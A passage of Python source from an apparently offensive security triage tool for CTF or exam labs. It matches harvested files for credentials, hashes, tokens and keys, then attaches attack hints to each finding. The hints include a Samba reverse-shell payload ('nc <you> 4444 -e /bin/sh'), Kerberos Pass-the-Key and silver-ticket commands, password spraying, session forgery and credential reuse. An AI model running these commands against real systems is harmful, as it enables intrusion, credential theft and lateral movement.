                            continue
                        ver = am.group(1)
                        report.add("CRITICAL", "RECON", path, lineno,
                                   f"Samba {ver} - CVE-2007-2447 username map script RCE",
                                   hint=("manual: smbclient //<host>/notashare -U '/=`nc <you> 4444 -e /bin/sh`'  "
                                         "(spawns reverse shell as root; spoofing-free)"))
                        hit = True
                        break
                    # iter-17: Java/C#/JS typed field secret (HTB Blocky)
                    if name == "Java field secret":
                        field, val = am.group(1), am.group(2)
                        if (not val or filters.is_placeholder(val)
                                or filters.is_known_example(val)
                                or filters.is_code_not_literal(val, line)):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{field}: {val}",
                                   hint=("decompiled/source field literal - reuse against the service "
                                         "the class talks to (DB/LDAP/HTTP) and try same pw for OS users "
                                         "(SSH/SMB) on the same box"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-17: linPEAS bracketed-CVE finding
                    if name == "PEAS bracketed CVE":
                        if filters.is_doc_file(path):
                            continue
                        cve_match = re.search(r'CVE-\d{4}-\d{2,7}', line)
                        cve = cve_match.group(0) if cve_match else "CVE-?"
                        report.add("HIGH", "RECON", path, lineno,
                                   f"linPEAS CVE highlight: {cve}",
                                   hint=f"searchsploit {cve}; verify version on host; if exam-legal PoC exists, manual exploitation only")
                        hit = True
                        break
                    # iter-17: Flask itsdangerous session cookie
                    if name == "Flask itsdangerous":
                        if filters.is_doc_file(path):
                            continue
                        tok = am.group(1)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Flask session: {tok[:30]}...",
                                   hint=("flask-unsign --decode --cookie '<value>'; "
                                         "if SECRET_KEY known: flask-unsign --sign --cookie \"{'user':'admin'}\" --secret '<key>'"))
                        hit = True
                        break
                    # ---- iter-18 dispatch branches ----
                    # Kerberos AES key (Pass-the-Key primitive)
                    if name == "Kerberos AES key":
                        who = am.group('who')
                        etype = am.group('etype')
                        key = am.group('key').lower()
                        if filters.is_canonical_sample(key):
                            continue
                        # Pass-the-Key requires the exact key length:
                        # aes256-cts-hmac-sha1-96 → 64 hex (32 bytes)
                        # aes128-cts-hmac-sha1-96 → 32 hex (16 bytes)
                        # des-cbc-md5             → 16 hex (8 bytes)
                        expected = {"aes256": 64, "aes128": 32}.get(etype[:6], 16)
                        if len(key) != expected:
                            continue
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"Kerberos {etype} key {who}: {key}",
                                   hint=(f"Pass-the-Key: impacket-getTGT '<dom>/{who}' -aesKey {key} -dc-ip <dc>; "
                                         f"silver ticket: ticketer.py -aesKey {key} -nthash <nt> "
                                         f"-domain-sid <SID> -domain <dom> -spn <spn> Administrator"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="kerberos_key", user=who,
                                               hash=key, source=path, line=lineno))
                        hit = True
                        break
                    if name == "$MACHINE.ACC NT hash":
                        dom = am.group('dom')
                        host = am.group('host')
                        nt = am.group('nt')
                        if filters.is_blank_hash(nt) or filters.is_canonical_sample(nt):
                            continue
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"$MACHINE.ACC NTLM (NT) {dom}\\{host}: {nt}",
                                   hint=(f"machine account hash - silver-ticket primitive: "
                                         f"nxc smb <dc> -u '{host}' -H {nt} --local-auth; or "
                                         f"impacket-ticketer -nthash {nt} -domain-sid <SID> "
                                         f"-domain {dom} -spn cifs/{host[:-1]} Administrator"))
                        from analyzers.patterns import HASHES
                        HASHES.append(("1000", "NTLM", nt, path, lineno))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="hash", user=host, hash=nt,
                                               hash_mode="1000", domain=dom,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "pypykatz Kerberos AES key":
                        etype, key = am.group(1), am.group(2)
                        if filters.is_canonical_sample(key):
                            continue
                        if etype == "aes256" and len(key) != 64:
                            continue
                        if etype == "aes128" and len(key) != 32:
                            continue
                        if filters.is_doc_file(path):
                            continue
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"pypykatz Kerberos {etype} key: {key}",
                                   hint=(f"Pass-the-Key: impacket-getTGT '<dom>/<user>' -aesKey {key}; "
                                         "mimikatz: kerberos::ptt + sekurlsa::ekeys"))
                        hit = True
                        break
                    if name == "impacket-lookupsid domain SID":
                        if filters.is_doc_file(path):
                            continue
                        dsid = am.group(1)
                        report.add("INFO", "RECON", path, lineno,
                                   f"Domain SID: {dsid}",
                                   hint=("seeds impacket-ticketer -domain-sid; "
                                         "R-GOLDEN/R-SILVER will emit a real SID"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="ldap_attr", source=path, line=lineno,
                                               meta={"dc_sid": dsid}))
                        hit = True
                        break
                    if name in ("nxc rid-brute user", "impacket-lookupsid user"):
                        if filters.is_doc_file(path):
                            continue
                        rid_str, dom, user, sidtype = am.group(1), am.group(2), am.group(3), am.group(4)
                        if sidtype != "User":
                            continue   # we already learn computers via _NXC_SVC
                        try:
                            rid_n = int(rid_str)
                        except ValueError:
                            continue
                        if user in seen_svc:
                            continue
                        seen_svc.add(user)
                        _tool = ("nxc rid-brute" if name.startswith("nxc")
                                 else "impacket-lookupsid")
                        sev = "HIGH" if rid_n in (500, 512, 519, 518, 520) else "MEDIUM"
                        report.add(sev, "RECON", path, lineno,
                                   f"{_tool} user: {dom}\\{user} (RID {rid_n})",
                                   hint=("add to users.txt; AS-REPRoast (impacket-GetNPUsers ... -no-pass) "
                                         "+ password-spray; RID 500/512/519 = high-value targets"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="user", user=user, domain=dom,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "Rubeus dump ticket":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Rubeus dump: Base64EncodedTicket blob follows",
                                   hint=("extract next b64 block: awk '/Base64EncodedTicket/,/^[[:space:]]*$/' "
                                         "<file> | base64 -d > t.kirbi; ticketConverter.py t.kirbi t.ccache; "
                                         "export KRB5CCNAME=t.ccache; klist"))
                        hit = True
                        break
                    if name == "Snaffler annotated":
                        if filters.is_doc_file(path):
                            continue
                        color, rule_n, target_p, snippet = (am.group(1), am.group(2),
                                                            am.group(3), am.group(4) or "")
                        sev_map = {"Black": "CRITICAL", "Red": "HIGH",
                                   "Yellow": "MEDIUM", "Green": "INFO"}
                        sev = sev_map.get(color, "MEDIUM")
                        snippet_short = snippet[:80].replace("\n", " ")
                        report.add(sev, "INTERESTING FILES", path, lineno,
                                   f"Snaffler {color} ({rule_n}): {target_p}",
                                   hint=f"smbclient copy / read: {target_p}  -  rule {rule_n}"
                                        + (f"  snippet: {snippet_short}" if snippet_short else ""))
                        # iter-162: Snaffler's grep-mode snippet often carries
                        # the actual credential match (e.g. Rule
                        # 'KeepConfigPasswordOrange' fires on a web.config line
                        # like `<add key="pw" value="Sup3r!">`, and the whole
                        # line lands in the annotation). Feed the snippet
                        # through credline so a real cred gets surfaced as a
                        # separate CRED PAIRS finding on top of the file note.
                        # The classifier already rejects placeholders / brute
                        # templates / ACL masks so FP risk stays low.
                        if snippet and store is not None:
                            _sc = credline.classify(snippet)
                            if _sc and _sc.kind == "cred" and _sc.password:
                                _pw_sh = _sc.password.replace("'", "'\\''")
                                _u_disp = _sc.user or "<user>"
                                _u_sh = _u_disp.replace("'", "'\\''")
                                report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                           f"[Snaffler grep] {_u_disp}:{_sc.password}"
                                           + (f"  ({_sc.note})" if _sc.note else ""),
                                           hint=f"reuse: netexec smb <target> -u '{_u_sh}' -p '{_pw_sh}'")
                                from analyzers.ingest.evidence import Evidence
                                store.add(Evidence(kind="plaintext", user=_sc.user,
                                                   plaintext=_sc.password,
                                                   source=path, line=lineno))
                        hit = True
                        break
                    if name == "Snaffler share":
                        if filters.is_doc_file(path):
                            continue
                        share = am.group(1)
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"Snaffler readable share: {share}",
                                   hint="smbclient.py <user>@<host> -no-pass; cd <share-name> -> enumerate")
                        hit = True
                        break
                    # iter-17: nmap NSE smb-vuln + ProFTPd CPFR/CPTO are
                    # multi-line; dispatched from _multiline_passes() below.
                    # iter-17: Steghide artifact (rijndael fingerprint)
                    if name == "Steghide artifact":
                        if filters.is_doc_file(path):
                            continue
                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                   "Steghide artifact (rijndael-CBC payload)",
                                   hint=("steghide info <carrier>; steghide extract -sf <carrier> -p '<pass>'  "
                                         "(passphrase often in nearby notes; sweep: stegseek <jpg> rockyou.txt)"))
                        hit = True
                        break
                    # iter-17: PHP wrapper LFI URL
                    if name == "PHP wrapper LFI":
                        if filters.is_doc_file(path):
                            continue
                        wrapper = am.group(0)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"PHP wrapper LFI: {wrapper[:80]}",
                                   hint=("LFI/SSRF wrapper - response body is b64-encoded SOURCE of the resource "
                                         "param; decode: curl ... | base64 -d   |  also try "
                                         "/etc/passwd, /var/www/html/config.php, /proc/self/environ"))
                        hit = True
                        break
                    if name == "cron script ref":
                        # filename gate: only fire on actual cron config files.
                        base = os.path.basename(path).lower()
                        in_cron = ("crontab" in base or "/cron" in path.lower()
                                   or "spool/cron" in path.lower()
                                   or "/etc/anacrontab" in path.lower())
                        if not in_cron:
                            continue
                        script = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"cron-invoked script: {script}",
                                   hint=f"check writability: ls -la {script}  - if any non-root write -> code-as-root")
                        hit = True
                        break
                    if name == "hashcat potfile":
                        # filename gate: only fire on potfile-shaped paths.
                        # Real hashcat ~/.local/share/hashcat/hashcat.potfile,
                        # custom *.pot/.potfile, or any file containing 'crack'
                        # in the basename.
                        base = os.path.basename(path).lower()
                        if not (base.endswith(('.pot', '.potfile'))
                                or 'potfile' in base or 'hashcat' in base
                                or 'cracked' in base or '.crack' in base):
                            continue
                        h, plain = am.group(1), am.group(2)
                        # plain-half sanity: not just hex (still inside a hash),
                        # not a placeholder, not exactly the same as the hash.
                        if (filters.is_placeholder(plain) or len(plain) < 3
                                or re.match(r'^[a-fA-F0-9]+$', plain)
                                or plain == h):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"hashcat cracked: {h[:40]}... -> '{plain}'",
                                   hint=f"reuse plaintext: nxc smb <host> -u <user> -p '{plain}'  (per the hash's source)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=plain, source=path, line=lineno))
                        hit = True
                        break
                    if name == "john pot":
                        base = os.path.basename(path).lower()
                        if not (base == 'john.pot' or base.endswith('.pot')
                                or 'john' in base or 'cracked' in base):
                            continue
                        h, plain = am.group(1), am.group(2)
                        if (filters.is_placeholder(plain) or len(plain) < 3
                                or re.match(r'^[a-fA-F0-9]+$', plain)):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"john cracked: {h[:40]}... -> '{plain}'",
                                   hint=f"reuse plaintext: nxc smb <host> -u <user> -p '{plain}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=plain, source=path, line=lineno))
                        hit = True
                        break
                    if name == "AWS session token":
                        tok = am.group(1)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"AWS session token: {tok[:40]}...",
                                   hint="aws sts get-caller-identity  (export AWS_ACCESS_KEY_ID, _SECRET_ACCESS_KEY, _SESSION_TOKEN)")
                        hit = True
                        break
                    if name == "GCP service account":
                        kid = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"GCP service-account JSON key (kid {kid[:12]}...)",
                                   hint="gcloud auth activate-service-account --key-file <this.json>; gcloud projects list")
                        hit = True
                        break
                    if name == "kubeconfig token":
                        tok = am.group(1)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"kubeconfig token: {tok[:40]}...",
                                   hint="kubectl --kubeconfig <this> get pods --all-namespaces  -> escalate to nodes via privileged pods")
                        hit = True
                        break
                    # iter-27: Docker config.json auth block - b64 of user:pw
                    if name == "docker config auth":
                        import base64 as _b64
                        b64v = am.group(1)
                        if filters.is_placeholder(b64v):
                            continue
                        try:
                            dec = _b64.b64decode(b64v, validate=True).decode(
                                "utf-8", "replace")
                        except Exception:
                            dec = ""
                        if dec and ":" in dec and len(dec) < 200:
                            u, p = dec.split(":", 1)
                            if p and not filters.is_placeholder(p):
                                # iter-176: shell-escape u + p.
                                _u_sh_dl = u.replace("'", "'\\''")
                                _p_sh_dl = p.replace("'", "'\\''")
                                report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                           f"Docker registry auth: {u}:{p}",
                                           hint=f"docker login <registry> -u '{_u_sh_dl}' -p '{_p_sh_dl}'; "
                                                f"docker pull / image extract for secrets")
                                if store is not None:
                                    from analyzers.ingest.evidence import Evidence
                                    store.add(Evidence(kind="plaintext", user=u,
                                                       plaintext=p, source=path,
                                                       line=lineno))
                                hit = True
                                break
                    # iter-27: Ansible playbook / inventory password variable
                    if name == "ansible var pass":
                        varname, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith(("{{", "$")):
                            # jinja templating / env-var reference - skip
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"Ansible {varname}: {pw}",
                                   hint=(f"reuse: ssh <user>@<host> with '{pw}'; "
                                         f"or ansible-playbook uses this directly"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-27: GitLab runner token
                    if name == "gitlab runner token":
                        tok = am.group(1)
                        if filters.is_placeholder(tok):
                            continue
                        # /etc/gitlab-runner/config.toml carries the runner
                        # registration token; not a user cred, but a foothold
                        # into the CI system.
                        base = os.path.basename(path).lower()
                        if "runner" not in base and "gitlab" not in base \
                                and not path.lower().endswith("config.toml"):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"GitLab runner token: {tok[:16]}...",
                                   hint=(f"curl -H 'PRIVATE-TOKEN: {tok}' https://<gitlab>/"
                                         f"api/v4/projects  -> project foothold"))
                        hit = True
                        break
                    # iter-27: Chef encrypted data_bag marker
                    if name == "chef databag marker":
                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                   "Chef encrypted data_bag - needs shared secret",
                                   hint=("knife data bag show -F json <bag> <item> "
                                         "--secret-file <secret>  (locate secret in "
                                         "/etc/chef/encrypted_data_bag_secret)"))
                        hit = True
                        break
                    # iter-28: systemd Environment= password / secret / token
                    if name == "systemd Environment=":
                        varname, val = am.group(1), am.group(2).strip()
                        if filters.is_placeholder(val) or val.startswith("$"):
                            continue
                        # only fire in likely-service-unit files or logs of same
                        plow = path.lower()
                        base = os.path.basename(plow)
                        if not (base.endswith((".service", ".socket", ".timer",
                                                ".target", ".mount"))
                                or "systemd" in plow or "systemctl" in plow
                                or "/etc/systemd/" in plow
                                or plow.endswith((".log", ".txt", ".conf"))):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"systemd Environment= {varname}={val}",
                                   hint=(f"service reads env at start; run "
                                         f"`systemctl cat` to confirm, then "
                                         f"reuse '{val}' against the service DB/API"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-28: RabbitMQ password_hash moved to _multiline_passes
                    # iter-29: APT auth.conf machine entry
                    # iter-94: same regex fires on .netrc / .authinfo / _netrc
                    # (Windows curl / git) too - relabel finding based on the
                    # filename so it says 'netrc cred' (the more common form).
                    if name == "apt auth machine":
                        host, u, pw = am.group(1), am.group(2), am.group(3)
                        if filters.is_placeholder(pw):
                            continue
                        _plow = path.lower().replace("\\", "/")
                        _base = os.path.basename(_plow)
                        if (_base in (".netrc", "_netrc", ".authinfo")
                                or "netrc" in _base):
                            _label = f"netrc cred for {host}: {u}:{pw}"
                            _hint = f"connect via '{host}' with {u}:{pw} (curl/ftp/git use this)"
                        elif "auth.conf" in _plow or "/apt/" in _plow:
                            _label = f"APT auth {host}: {u}:{pw}"
                            _hint = f"apt update via '{host}' with {u}:{pw}"
                        else:
                            _label = f"machine-auth {host}: {u}:{pw}"
                            _hint = f"'{host}' auth: {u}:{pw}  (netrc / apt-format cred)"
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   _label, hint=_hint)
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-29: HAProxy insecure-password user
                    if name == "haproxy user insecure":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"HAProxy userlist: {u}:{pw}",
                                   hint=f"try against HAProxy stats socket / "
                                        f"backend: curl -u '{u}:{pw}' <url>")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-202: Redis Sentinel auth-pass. Emits CRITICAL
                    # CRED PAIRS with sentinel + master name context.
                    if name == "Redis Sentinel auth-pass":
                        master_name, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw):
                            continue
                        _p_sh_rs = pw.replace("'", "'\\''")
                        _m_sh_rs = master_name.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"Redis Sentinel auth-pass "
                                   f"({master_name}): {pw}",
                                   hint=(f"redis-cli -h <sentinel-host> -p "
                                         f"26379 -a '{_p_sh_rs}' SENTINEL "
                                         f"MASTERS  |  connect to master: "
                                         f"redis-cli -h <master-host> "
                                         f"-a '{_p_sh_rs}'"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext",
                                               plaintext=pw, source=path,
                                               line=lineno,
                                               meta={"sentinel_master": master_name}))
                        hit = True
                        break
                    # iter-202: Vault token (env var / X-Vault-Token / bare
                    # file). Filename gate: only auto-fire on .vault-token /
                    # vault-token / X-Vault-Token headers. Env var form fires
                    # via the VAULT_TOKEN prefix in the pattern itself so it
                    # can be broad.
                    if name == "Vault token file":
                        tok = am.group(1)
                        _base_vt = os.path.basename(path).lower()
                        _plow_vt = path.lower().replace("\\", "/")
                        _in_vault_file = (_base_vt in (".vault-token",
                                                       "vault-token", ".vault_token")
                                          or "/vault/" in _plow_vt
                                          or "VAULT_TOKEN" in line
                                          or "X-Vault-Token" in line)
                        if not _in_vault_file:
                            continue
                        # Reject common placeholder shapes
                        if (tok.startswith(("00000000-", "s.example",
                                             "hvs.example"))
                                or filters.is_placeholder(tok)):
                            continue
                        _tok_sh = tok.replace("'", "'\\''")
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"Vault token: {tok[:40]}"
                                   f"{'...' if len(tok) > 40 else ''}",
                                   hint=(f"export VAULT_TOKEN='{_tok_sh}'; "
                                         f"vault secrets list; vault token "
                                         f"lookup  |  vault kv get -field=value "
                                         f"secret/<path>  - read every mounted "
                                         f"secret store"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext",
                                               plaintext=tok, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-29: HAProxy stats auth
                    if name == "haproxy stats auth":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"HAProxy stats auth: {u}:{pw}",
                                   hint=f"curl -u '{u}:{pw}' http://<haproxy>/stats  "
                                        f"-> shows backend inventory")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-32: Spring datasource properties password
                    if name == "spring datasource props":
                        pw = am.group(1).strip().strip("'\"")
                        if filters.is_placeholder(pw) or pw.startswith(("${", "$")):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Spring datasource password: {pw}",
                                   hint=("Spring app connects to DB with this pw; "
                                         "try against the app + its DB backend"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-32: Python SECRET_KEY (Django/Flask/FastAPI)
                    if name == "python SECRET_KEY":
                        keyname, val = am.group(1), am.group(2)
                        if filters.is_placeholder(val) or val.startswith(("os.", "env")):
                            continue
                        # Django/Flask SECRET_KEY has ~50 char default; 16 min
                        # allows short config for smaller frameworks.
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{keyname}: {val[:60]}{'...' if len(val) > 60 else ''}",
                                   hint=("session/cookie signing key. flask-unsign "
                                         "or django cookie decode: reuse for "
                                         "session forgery"))
                        hit = True
                        break
                    # iter-32: uppercase PASSWORD dict entry (Django DATABASES
                    # + generic JSON/YAML config). iter-42 relabel: pick a
                    # honest label based on file context - Django only when
                    # the file looks like Django settings.py; otherwise
                    # generic config PASSWORD entry.
                    if name == "uppercase PASSWORD dict entry":
                        pw = am.group(1)
                        if filters.is_placeholder(pw) or pw.startswith(("os.", "env")):
                            continue
                        plow_p = path.lower()
                        base_p = os.path.basename(plow_p)
                        is_django = (base_p in ("settings.py", "local_settings.py",
                                                 "production.py")
                                     or "DATABASES" in line
                                     or "django" in plow_p)
                        label = ("Django DATABASES password" if is_django
                                 else "config PASSWORD entry")
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"{label}: {pw}",
                                   hint=(f"connect with '{pw}' - source is "
                                         f"{'Django settings' if is_django else 'a config file'}"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-57: K8s ServiceAccount JWT
                    if name == "k8s serviceaccount token":
                        tok = am.group(1)
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"K8s SA token: {tok[:60]}...",
                                   hint=("kubectl --token='<tok>' --server "
                                         "https://<apiserver>:6443 "
                                         "--insecure-skip-tls-verify get pods -A"))
                        hit = True
                        break
                    # iter-33: PowerShell $env:VARNAME = 'X' + Set-Item env:
                    # iter-43: also [Environment]::SetEnvironmentVariable().
                    if name in ("powershell env var secret",
                                "powershell set-item env",
                                "dotnet env setter"):
                        varname, val = am.group(1), am.group(2)
                        if (filters.is_placeholder(val) or
                                val.startswith(("${", "$", "(", "@"))):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"PowerShell $env:{varname} = {val}",
                                   hint=(f"Windows service-setup provisioning; "
                                         f"reuse '{val}' as service/user pw"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-29: rsyncd secrets file pointer
                    if name == "rsyncd secrets pointer":
                        p_ = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"rsyncd secrets file pointer: {p_}",
                                   hint=(f"read {p_} for 'user:password' rows; "
                                         f"anonymous rsync module if 'auth users' absent"))
                        hit = True
                        break
                    # iter-29: Postfix SASL map pointer
                    if name == "postfix sasl map":
                        p_ = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"Postfix SASL map pointer: {p_}",
                                   hint=(f"read {p_} for 'smtp.host user:pass' rows"))
                        hit = True
                        break
                    # iter-28: .pgpass row hint - already covered by credline
                    # for the classified form; this adds a keyword ASSIGNED
                    # SECRETS record with the host/db context for the operator.
                    if name == "pgpass row hint":
                        host, port, db, u, pw = (am.group(1), am.group(2),
                                                  am.group(3), am.group(4),
                                                  am.group(5))
                        plow = path.lower()
                        base = os.path.basename(plow)
                        if not (base == ".pgpass" or base.endswith(".pgpass")):
                            continue
                        if filters.is_placeholder(pw):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f".pgpass host={host} db={db} {u}:{pw}",
                                   hint=(f"psql -h {host} -p {port} -U '{u}' "
                                         f"-d '{db}'  (uses PGPASSFILE=this)"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    if name == "Terraform sensitive":
                        val = am.group(1)
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Terraform 'sensitive' output: {val[:60]}",
                                   hint="reuse value directly - tfstate keeps the plaintext even when marked sensitive")
                        hit = True
                        break
                    if name == "Azure access token":
                        tok = am.group(1)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Azure access token: {tok[:40]}...",
                                   hint="paste into az or use roadtools/aztoken; check token claims via jwt.io for tenant + roles")
                        hit = True
                        break
                    if name == "supervisord inet creds":
                        u, p = am.group(1), am.group(2)
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"supervisord inet creds: {u}:{p}",
                                   hint=f"curl -u '{u}:{p}' http://<host>:9001/  (web UI + XML-RPC)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
                        hit = True
                        break
                    if name == "asterisk manager":
                        u, p = am.group(1), am.group(2)
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"asterisk manager.conf [{u}]: secret={p}",
                                   hint=(f"asterisk AMI: nc <host> 5038; then send (CRLF-terminated): "
                                         f"'Action: Login\\r\\nUsername: {u}\\r\\nSecret: {p}\\r\\n\\r\\n'   "
                                         "(AMI keys are Username/Secret, not user/secret; CRLF mandatory)"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
                        hit = True
                        break
                    if name == "Veeam creds":
                        u, p = am.group(1), am.group(2)
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"Veeam stored cred: {u}:{p}",
                                   hint="Veeam backups carry the destination repo creds; reuse against the SMB/iSCSI target")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
                        hit = True
                        break
                    if name == "GH Actions secret ref":
                        # iter-11 FP audit: only fire on real GitHub Actions
                        # workflow files; dedup per (path, secret) so the same
                        # ${{ secrets.X }} doesn't spam N findings per file.
                        if filters.is_doc_file(path):
                            continue
                        plow = path.lower()
                        if not (".github/workflows/" in plow
                                or os.path.basename(plow) == "action.yml"
                                or os.path.basename(plow) == "action.yaml"):
                            continue
                        sec = am.group(1)
                        if sec in seen_svc:
                            continue
                        seen_svc.add(sec)
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"GH Actions secret reference: {sec}",
                                   hint="CI vault secret name - target if you have repo write/PR-comment access")
                        hit = True
                        break
                    if name == "atlassian secret":
                        val = am.group(1)
                        # iter-11 FP audit: <password>X</password> alone fires
                        # on Maven settings, README snippets, Spring XML examples,
                        # Pidgin accounts.xml, anywhere. Gate on:
                        #   1. doc files - never real loot
                        #   2. filename / path that names a known Atlassian /
                        #      tomcat / dbconfig / Pidgin file
                        #   3. value isn't a placeholder OR canonical default
                        #      (changeit/changeit123/admin/tomcat/manager/etc.)
                        if filters.is_placeholder(val) or filters.is_doc_file(path):
                            continue
                        low_v = val.lower().strip("'\"")
                        if low_v in ("changeit", "changeit123", "tomcat",
                                     "manager", "admin", "jonas", "redhat",
                                     "kafka", "jdbc:default"):
                            continue
                        base = os.path.basename(path).lower()
                        plow = path.lower()
                        is_atlassian_file = (
                            base in ("atlassian-user.xml", "dbconfig.xml",
                                     "server.xml", "confluence.cfg.xml",
                                     "jira-config.properties.xml",
                                     "crowd.cfg.xml", "seraph-config.xml",
                                     "accounts.xml")
                            or any(k in plow for k in ("/confluence/", "/jira/",
                                                       "/atlassian/", "/crowd/",
                                                       "/.purple/")))
                        if not is_atlassian_file:
                            # too generic outside an atlassian-shaped path
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"atlassian/<password>: {val}",
                                   hint="reuse against Confluence/Jira admin login; LDAP bind on the same XML often shares the pw")
                        hit = True
                        break
                    if name == "PSCredential SS blob":
                        blob = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"PSCredential Export-Clixml DPAPI blob ({len(blob)//2}B)",
                                   hint="recoverable ONLY by the same user+host: powershell -c 'Import-Clixml cred.xml | %{ \$_.GetNetworkCredential().Password }'")
                        hit = True
                        break
                    if name == "ovpn auth-user-pass":
                        f_ = am.group(1)
                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                   f"OpenVPN auth-user-pass file ref: {f_}",
                                   hint=f"read {f_} - line 1=user, line 2=plaintext password")
                        hit = True
                        break
                    if name == "WireGuard PrivateKey":
                        key = am.group(1)
                        report.add("HIGH", "PRIVATE KEYS", path, lineno,
                                   f"WireGuard PrivateKey: {key[:24]}...",
                                   hint="copy [Interface] block into wg-quick up <name>.conf and reach internal network")
                        hit = True
                        break
                    if name == "Cisco enable secret":
